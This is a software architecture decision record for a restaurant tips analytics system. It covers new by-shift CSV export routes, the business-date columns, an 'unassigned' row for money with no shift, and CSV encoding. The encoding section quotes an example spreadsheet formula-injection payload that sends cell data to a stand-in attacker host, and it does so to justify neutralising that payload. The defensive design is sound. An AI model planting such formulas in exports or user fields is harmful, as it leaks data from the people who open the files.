---
title: ADR-067 — Accounting's second list: by shift, alongside the calendar one
version: 1.0.0
status: Accepted
classification: Critical
owner: Founder
technical_owner: AI Technical Co-Founder
---

# ADR-067 — Accounting's second list: by shift, alongside the calendar one

**Status:** Accepted (Sprint 14), 2026-09-04. Five new export routes; no schema change; no tax logic.

---

## Context

**ADR-065 §3 decided that accounting gets TWO lists** — by shift and by calendar day, from the same rows with a different `GROUP BY`. The accountant is bound by law to a calendar period but reconciles against Z-reports that are per shift, and giving one list forces them to rebuild the other by hand.

**The decision was made and one of the two lists was delivered.** #139 moved the operational screens to shifts and deliberately left the exports calendar — correctly, because that is what ADR-065 says the accountant's legal unit is. But the shift-scoped exports were never built, so the second half of §3 has been a decision with no implementation since it was written. This ADR builds it.

---

## Decision

### 1. Separate routes, never a flag

| Route | Cut |
|---|---|
| `GET /analytics/revenue/export` | calendar day — **unchanged** |
| `GET /analytics/revenue/export/by-shift` | shift |
| `GET /analytics/tips/export` | calendar day — **unchanged** |
| `GET /analytics/tips/export/by-shift` | shift |
| `GET /analytics/reports/export` | calendar day — **unchanged** |
| `GET /analytics/reports/export/by-shift` | shift |
| `GET /analytics/staff-earnings/export` | calendar day |
| `GET /analytics/staff-earnings/export/by-shift` | shift |

**A `?byShift=true` parameter was rejected.** The reader of a call site must know what the file means without knowing what the false branch does, and ADR-065's own wording requires *"by shift"* and *"by calendar day"* to be legible without a tooltip. This is the same reasoning already applied to helper naming in #139: two names that say what they are beat one name plus a parameter.

**The calendar exports are untouched.** They are correct, they are what the law asks for, and a test asserts the calendar report export's header byte-for-byte so that a change to it fails rather than passes quietly.

### 2. Every row names which day it means — and a shift row names it twice

```
scope,businessDate,shiftId,openedAt,closedAt,amount
shift,2026-06-15,d290f1ee-…,2026-06-15T18:00:00+03:00,2026-06-16T02:00:00+03:00,1350
unassigned,,,,,200
```

`businessDate` is the day the venue **calls** this working day. `openedAt`/`closedAt` are the calendar instants it **actually spanned**. The pair is the split: a shift of the 15th that closed at 02:00 on the 16th states both facts on one line, and an accountant can see exactly where the two cuts diverge.

**The instants are in the venue's local time with its offset, not UTC — and this was found by a test, not by review.** The first implementation emitted `toISOString()`. In UTC the closing instant above is `2026-06-15T23:00:00Z`, whose date reads *the 15th*: rendered that way the file agrees with the calendar cut at exactly the boundary where the two are supposed to differ, and shows the accountant nothing to reconcile. The assertion that the closing date is **not** the business date failed, which is the only reason this was noticed. The offset is kept rather than dropped because a bare local time is ambiguous across the DST transition, and this file is evidence in a financial reconciliation.

### 3. The `unassigned` row, because a financial export must not lose money quietly

**ADR-065's own Consequences say rows written before ADR-064 have no `shiftId`, and no backfill can honestly repair them** — there is no record of when those venues closed their days. A by-shift export over such a period therefore omits real money.

So the file ends with an explicit row naming the money in the same calendar range that carries **no** shift. One query. Without it, an implementation that summed only shifts would report a smaller number and lose the rest **out of a financial export, without a word** — and the test for this fails against exactly that implementation.

**It is not a reconciling total, and must not be presented as one.** Shift rows are selected by business date while the unassigned row is selected by calendar window, so the two do not sum to the calendar export's figure at the range edges. **That divergence is the whole reason both lists exist** (ADR-065 §3); a design in which they always agreed would prove the second cut never happened.

### 4. Staff earnings for a period — and the name is the decision

`GET /analytics/staff-earnings/export` — who received how much in tips, by Membership, over a range, in a form that can be handed to a bookkeeper as-is.

```
dayBasis,from,to,membershipId,displayName,email,currency,tips
calendar,2026-06-01,2026-06-30,3fa85f64-…,Jonas Petraitis,jonas@…,EUR,45230
```

**It is not payroll, and that is not a wording preference.** In Model A the restaurant pays tips through wages. In Model B — the single target (ADR-053) — **the restaurant never receives the tip and therefore cannot pay it out**. A file called "payroll" would describe a money movement this product does not perform.

**There is no salary column, no withholding column, and no tax figure**, because we do not know whether a tax figure is displayed or withheld: **VMI has not answered.** A column added later is a change; a column that means the wrong thing today is a liability. A test asserts the absence of the words `payroll`, `salary`, `wage`, `withhold`, `tax` and `net pay` from the header, so adding one becomes a deliberate act rather than a drift.

**What differs from `/analytics/staff/export` is form, not data.** That file is three columns of identifiers; out of its download context it does not say what period it covers or on whose day it was counted. Every row here carries both, plus the currency and the person's name.

### 5. CSV encoding, which is where the security half lives

**Every export before this one emitted only machine-generated values** — UUIDs, ISO dates, decimal strings, emails — so a raw `join(",")` was safe by accident rather than by design. Staff earnings is the first to emit text a human typed: `displayName`.

- **Delimiters.** `O'Brien, Jr.` is an ordinary name. Unquoted it shifts every following column by one and nothing errors. RFC 4180 quoting is applied.
- **Formula injection.** A spreadsheet executes a cell beginning `=`, `+`, `-`, `@`, TAB or CR. A waiter who sets their display name to `=HYPERLINK("http://attacker.example/"&A1,"Total")` is not attacking us — **they are attacking the bookkeeper who opens our file**, and an accountant opening an export we generated is precisely the person who would trust it. Untrusted input reaching a third party through a file we produced is ours to neutralise; a leading apostrophe does it, and spreadsheets consume it when displaying the cell.

**This changes the bytes**, deliberately: a name is a label to be read, and a label's job is to be read safely. Any consumer needing the exact original reads the JSON route, which is not a spreadsheet.

---

## Consequences

**The permission is `data.export`, checked independently** — not by the new routes internally calling the read routes, which is the bug ADR-027 Decision 4 already records catching. A caller holding only `reports.view` is refused all five; the same caller holding `data.export` receives them. Both halves are asserted.

**`User.displayName` is used for the first time in an export.** ADR-026 recorded its absence as a limitation of Dashboard's Top Staff; the field exists now (#136), and a file for a human reader carries a human name rather than an email address.

**Not built, and named so it is a decision rather than a discovery:**

- **`GET /analytics/performance/export` has no by-shift twin.** Its rows are metrics, not days, and a shift-scoped version requires defining what "the previous period" means in shifts — how many shifts back, and what happens when a venue traded fewer. That is a product decision, not an engineering one, and inventing it here would be inventing a business rule.
- **Scheduled delivery of these files.** Estimated separately; it depends on whether this system can send email at all, which is a fact to establish before it is a feature to design.
- **Till and bank reconciliation.** No integrations exist; the pilot limitation is already recorded. `PaymentReconciliationService` stays calendar (ADR-065 §4).
- **Anything touching `TAX_PAYABLE`** — blocked by ADR-029, untouched here.

**A shift-scoped report over historical data is incomplete for that period** and now says so on its own last line. That is the honest form; it is not a repair, and ADR-065 already established that no honest repair exists.
